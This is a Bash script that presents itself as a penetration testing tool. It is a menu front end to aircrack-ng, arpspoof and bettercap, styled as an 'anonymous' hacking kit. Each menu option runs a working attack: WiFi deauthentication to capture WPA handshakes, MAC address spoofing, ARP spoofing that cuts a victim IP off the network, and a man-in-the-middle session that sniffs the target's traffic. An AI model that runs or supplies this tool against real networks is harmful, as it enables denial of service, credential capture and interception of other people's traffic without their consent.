#!/bin/bash
# =============================================================
# TOOL   : XX-KALI-ULTIMATE (ANONYMOUS EDITION)
# GOAL   : PROFESSIONAL NETWORK PENETRATION TESTING
# =============================================================

# --- [ Colors Setup ] ---
R='\033[1;31m'; G='\033[1;32m'; Y='\033[1;33m'
B='\033[1;34m'; P='\033[1;35m'; C='\033[1;36m'
W='\033[1;37m'; N='\033[0m'

# --- [ Root Check ] ---
if [[ $EUID -ne 0 ]]; then
   echo -e "${R}[!] Error: This script must be run as ROOT (sudo).${N}"
   exit 1
fi

# --- [ Dependencies Check ] ---
check_deps() {
    tools=("aircrack-ng" "bettercap" "arpspoof" "xterm" "macchanger" "arp-scan")
    for tool in "${tools[@]}"; do
        if ! command -v $tool &> /dev/null; then
            echo -e "${Y}[*] Installing missing tool: $tool...${N}"
            apt-get install $tool -y > /dev/null 2>&1
        fi
    done
}

# --- [ Banner - Anonymous Version ] ---
banner() {
    clear
    echo -e "${C}"
    echo "  ██╗  ██╗██╗  ██╗██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ "
    echo "  ╚██╗██╔╝╚██╗██╔╝██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗"
    echo "   ╚███╔╝  ╚███╔╝ ███████║███████║██║     █████╔╝ █████╗  ██████╔╝"
    echo "   ██╔██╗  ██╔██╗ ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗"
    echo "  ██╔╝ ██╗██╔╝ ██╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║"
    echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
    echo -e "  [+--- GHOST NETWORK OPERATOR | STATUS: ANONYMOUS ---+]${N}"
}

# --- [ WiFi Attack Module ] ---
wifi_module() {
    while true; do
        banner
        echo -e "${Y}--- [ WIFI HACKING MENU ] ---${N}"
        echo -e "${W}[1] Enable Monitor Mode (wlan0)"
        echo -e "[2] Disable Monitor Mode"
        echo -e "[3] Scan Networks (Airodump-ng)"
        echo -e "[4] Attack & Capture Handshake (Deauth)"
        echo -e "[5] Change MAC Address (Spoof Identity)"
        echo -e "[0] Return to Main Menu${N}"
        echo -en "\n${C}WIFI-HACK >> ${N}"
        read w_opt

        case $w_opt in
            1)
                echo -e "${G}[*] Enabling Monitor Mode...${N}"
                airmon-ng start wlan0 > /dev/null 2>&1
                echo -e "${G}[OK] Interface is now wlan0mon${N}"; sleep 2 ;;
            2)
                airmon-ng stop wlan0mon > /dev/null 2>&1
                echo -e "${R}[*] Monitor Mode Disabled.${N}"; sleep 2 ;;
            3)
                echo -e "${Y}[!] Press Ctrl+C to stop scanning...${N}"; sleep 1
                airodump-ng wlan0mon ;;
            4)
                echo -en "${P}Enter Target BSSID: ${N}"; read bssid
                echo -en "${P}Enter Channel (CH): ${N}"; read ch
                echo -en "${P}Enter File Name to save: ${N}"; read fname
                xterm -geometry 100x20+0+0 -e "aireplay-ng --deauth 50 -a $bssid wlan0mon" &
                airodump-ng --bssid $bssid -c $ch -w $fname wlan0mon
                ;;
            5)
                ifconfig wlan0 down
                macchanger -r wlan0
                ifconfig wlan0 up
                echo -e "${G}[*] MAC Address Spoofed!${N}"; sleep 2 ;;
            0) break ;;
        esac
    done
}

# --- [ Network Attack Module ] ---
net_module() {
    while true; do
        banner
        echo -e "${Y}--- [ NETWORK ATTACK MENU ] ---${N}"
        echo -e "${W}[1] Scan Local Network (ARP Scan)"
        echo -e "[2] Simple NetCut (ARP Spoof)"
        echo -e "[3] Bettercap Session (Sniffing/DNS)"
        echo -e "[4] MITM Attack (Full Traffic Control)"
        echo -e "[0] Return to Main Menu${N}"
        echo -en "\n${C}NET-ATTACK >> ${N}"
        read n_opt

        case $n_opt in
            1)
                echo -e "${G}[*] Scanning connected devices...${N}"
                arp-scan --localnet
                echo -e "\nPress Enter to continue..."; read ;;
            2)
                echo -en "${P}Enter Victim IP: ${N}"; read vip
                echo -en "${P}Enter Gateway IP: ${N}"; read gip
                echo -e "${R}[*] NetCut Started. Ctrl+C to stop.${N}"
                arpspoof -i eth0 -t $vip $gip ;;
            3)
                echo -e "${G}[*] Starting Bettercap...${N}"
                bettercap -eval "net.probe on; net.show" ;;
            4)
                echo -en "${P}Enter Target IP: ${N}"; read tip
                echo -e "${G}[*] Redirecting Traffic...${N}"
                echo 1 > /proc/sys/net/ipv4/ip_forward
                bettercap -eval "set arp.spoof.targets $tip; arp.spoof on; net.sniff on" ;;
            0) break ;;
        esac
    done
}

# --- [ Main Loop ] ---
check_deps
while true; do
    banner
    echo -e "${Y}--- [ MAIN SELECTION ] ---${N}"
    echo -e "${C}[1] ${W}WIFI ATTACKS (Handshake/Deauth)"
    echo -e "${C}[2] ${W}NETWORK ATTACKS (NetCut/MITM)"
    echo -e "${C}[3] ${W}INSTALL/UPDATE DEPENDENCIES"
    echo -e "${C}[0] ${W}EXIT TOOL${N}"
    echo -en "\n${C}XX-KALI >> ${N}"
    read main_choice

    case $main_choice in
        1) wifi_module ;;
        2) net_module ;;
        3) 
            echo -e "${G}[*] Updating system and tools...${N}"
            apt update && check_deps
            echo -e "${G}[OK] System tools are up to date.${N}"; sleep 2 ;;
        0)
            echo -e "${G}Exiting... Safe travels, Ghost.${N}"
            exit 0 ;;
        *)
            echo -e "${R}[!] Invalid Option.${N}"; sleep 1 ;;
    esac
done

